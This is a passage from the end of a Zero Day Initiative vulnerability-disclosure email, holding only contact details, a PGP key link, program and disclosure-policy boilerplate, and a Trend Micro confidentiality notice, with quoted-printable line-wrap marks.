us at any time:

Zero Day Initiative
zdi-disclosures@trendmicro.com

The PGP key used for all ZDI vendor communications is available from:

  http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc

-- INFORMATION ABOUT THE ZDI --------------------
Established by TippingPoint and acquired by Trend Micro, the Zero Day Ini=
tiative (ZDI) neither re-sells vulnerability details nor exploit code. In=
stead, upon notifying the affected product vendor, the ZDI provides its T=
rend Micro TippingPoint customers with zero day protection through its in=
trusion prevention technology. Explicit details regarding the specifics o=
f the vulnerability are not exposed to any parties until an official vend=
or patch is publicly available.

Please contact us for further details or refer to:

  http://www.zerodayinitiative.com

-- DISCLOSURE POLICY ----------------------------

Our vulnerability disclosure policy is available online at:

  http://www.zerodayinitiative.com/advisories/disclosure_policy/
    
TREND MICRO EMAIL NOTICE
The information contained in this email and any attachments is confidenti=
al
and may be subject to copyright or other intellectual property protection=
.
If you are not the intended recipient, you are not authorized to use or
disclose this information, and we request that you notify us by reply mai=
l or
telephone and delete the original message from your mail system.
For details about what personal information we collect and why, please se=
e our Privacy Notice on our website at: [ https://www.trendmicro.com/priv=
acy]

